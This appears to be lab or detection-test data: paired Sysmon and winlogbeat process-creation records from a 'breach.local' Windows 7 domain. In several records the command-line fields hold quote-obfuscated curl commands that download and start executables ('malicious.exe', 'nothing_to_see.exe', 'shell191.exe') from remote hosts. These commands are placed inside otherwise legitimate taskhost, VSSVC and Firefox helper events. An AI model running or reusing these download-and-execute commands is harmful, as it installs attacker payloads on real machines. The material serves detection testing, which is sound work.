"{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3.breach.local', 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'name': 'CLIENT1'}"
"{'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}","{'md5': 'eb32c070e658937aa9fa9f3ae629b2b8', 'sha256': '70ba57fb0bf2f34b86426d21559f5f6d05c1268193904de8e959d7b06ce964ce'}"
"{'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}"
2021-02-05T11:04:04.673Z,2021-02-04T22:29:08.545Z
"{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1'}"
"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'entity_id': '{19FC45AC-7534-601C-0000-0010469C0200}', 'pid': 2164, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'cu""""rl.exe -O http://remote.server/malicious.exe & start malicious.exe'}"
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'], 'user': 'LOCAL SERVICE'}","{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T11:04:06.893Z', 'module': 'sysmon'}","{'category': ['process'], 'type': ['start', 'process_start'], 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.299Z', 'kind': 'event', 'module': 'sysmon'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 11:04:04.673
ProcessGuid: {19FC45AC-2624-601D-0000-0010B2D06E00}
ProcessId: 1988
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-7690-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:08.545
ProcessGuid: {19FC45AC-7534-601C-0000-0010469C0200}
ProcessId: 2164
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-7527-601C-0000-00104B610000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'thread': {'id': 1716}, 'pid': 1928}, 'event_id': 1, 'record_id': 1671, 'event_data': {'Description': 'Host Process for Windows Tasks', 'OriginalFileName': 'taskhost.exe', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'TerminalSessionId': '0', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'LogonId': '0x3e5', 'Company': 'Microsoft Corporation', 'LogonGuid': '{19FC45AC-7690-601C-0000-0020E5030000}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'api': 'wineventlog', 'opcode': 'Info', 'version': 5, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT1.breach.local'}","{'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT1.breach.local', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1297, 'api': 'wineventlog', 'event_data': {'Description': 'Host Process for Windows Tasks', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'taskhost.exe', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e7', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'TerminalSessionId': '0', 'IntegrityLevel': 'System'}, 'process': {'pid': 1524, 'thread': {'id': 1792}}}"
2021-02-05T11:04:04.673Z,2021-02-04T23:04:58.703Z
"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'pid': 3124, 'executable': 'C:\\Windows\\System32\\VSSVC.exe', 'command_line': '""cu""rl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe', 'entity_id': '{19FC45AC-7D9A-601C-0000-001052F90E00}', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'VSSVC.exe', 'args': ['C:\\Windows\\system32\\vssvc.exe'], 'hash': {'md5': '209a3b1901b83aeb8527ed211cce9e4c', 'sha256': '1a431f6409f8e0531f600f8f988ecececb902da26bbaaf1de74a5cac29a7cb44'}, 'working_directory': 'C:\\Windows\\system32\\'}"
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'], 'user': 'LOCAL SERVICE'}","{'user': 'SYSTEM', 'hash': ['209a3b1901b83aeb8527ed211cce9e4c', '1a431f6409f8e0531f600f8f988ecececb902da26bbaaf1de74a5cac29a7cb44']}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'sha256': '1a431f6409f8e0531f600f8f988ecececb902da26bbaaf1de74a5cac29a7cb44', 'md5': '209a3b1901b83aeb8527ed211cce9e4c'}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T11:04:06.893Z', 'module': 'sysmon'}","{'category': ['process'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T23:04:59.962Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon', 'type': ['start', 'process_start']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 11:04:04.673
ProcessGuid: {19FC45AC-2624-601D-0000-0010B2D06E00}
ProcessId: 1988
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-7690-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 23:04:58.703
ProcessGuid: {19FC45AC-7D9A-601C-0000-001052F90E00}
ProcessId: 3124
Image: C:\Windows\System32\VSSVC.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Microsoft® Volume Shadow Copy Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: VSSVC.EXE
CommandLine: C:\Windows\system32\vssvc.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'thread': {'id': 1716}, 'pid': 1928}, 'event_id': 1, 'record_id': 1671, 'event_data': {'Description': 'Host Process for Windows Tasks', 'OriginalFileName': 'taskhost.exe', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'TerminalSessionId': '0', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'LogonId': '0x3e5', 'Company': 'Microsoft Corporation', 'LogonGuid': '{19FC45AC-7690-601C-0000-0020E5030000}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'api': 'wineventlog', 'opcode': 'Info', 'version': 5, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT1.breach.local'}","{'api': 'wineventlog', 'process': {'thread': {'id': 1716}, 'pid': 1928}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1423, 'task': 'Process Create (rule: ProcessCreate)', 'event_id': 1, 'computer_name': 'CLIENT1.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': 'Info', 'version': 5, 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Microsoft® Volume Shadow Copy Service', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-768F-601C-0000-0020E7030000}', 'OriginalFileName': 'VSSVC.EXE', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e7', 'TerminalSessionId': '0'}}"
2021-02-05T11:04:04.673Z,2021-02-04T23:56:54.258Z
"{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}","{'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2'}"
"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'entity_id': '{19FC45AC-89C6-601C-0000-001024DD1400}', 'command_line': 'c""ur""l -O http://192.168.191.1/shell191.exe & start shell191.exe', 'working_directory': 'C:\\BREACH\\', 'name': 'helper.exe', 'hash': {'md5': '9178bd65fc4f7ec665c799dc801d4f1e', 'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8'}, 'pid': 2512, 'executable': 'C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', 'parent': {'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'command_line': '""C:\\Program Files\\Mozilla Firefox\\firefox.exe"" -foreground', 'name': 'firefox.exe'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', '/UpdateShortcutAppUserModelIds']}"
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'domain': 'BREACH', 'name': 'client2'}"
"{'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'], 'user': 'LOCAL SERVICE'}","{'user': 'client2', 'hash': ['9178bd65fc4f7ec665c799dc801d4f1e', '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8']}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8', 'md5': '9178bd65fc4f7ec665c799dc801d4f1e'}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T11:04:06.893Z', 'module': 'sysmon'}","{'type': ['start', 'process_start'], 'category': ['process'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T23:56:55.350Z', 'kind': 'event', 'code': 1, 'module': 'sysmon'}"
"{'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'name': 'CLIENT1.breach.local', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86'}","{'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'name': 'CLIENT2.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 11:04:04.673
ProcessGuid: {19FC45AC-2624-601D-0000-0010B2D06E00}
ProcessId: 1988
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-7690-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 23:56:54.258
ProcessGuid: {19FC45AC-89C6-601C-0000-001024DD1400}
ProcessId: 2512
Image: C:\Program Files\Mozilla Firefox\uninstall\helper.exe
FileVersion: 38.0.5
Description: Firefox Helper
Product: Firefox
Company: Mozilla Corporation
OriginalFileName: helper.exe
CommandLine: ""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds
CurrentDirectory: C:\BREACH\
User: BREACH\client2
LogonGuid: {19FC45AC-76D9-601C-0000-002027FB0000}
LogonId: 0xfb27
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=9178BD65FC4F7EC665C799DC801D4F1E,SHA256=67EC19C47423B9AFB9E84E56530AD59DB07BE36EB68C00EDFAF5CB36A0F65ED8
ParentProcessGuid: {19FC45AC-89C4-601C-0000-00103CC41400}
ParentProcessId: 3456
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
ParentCommandLine: ""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground"
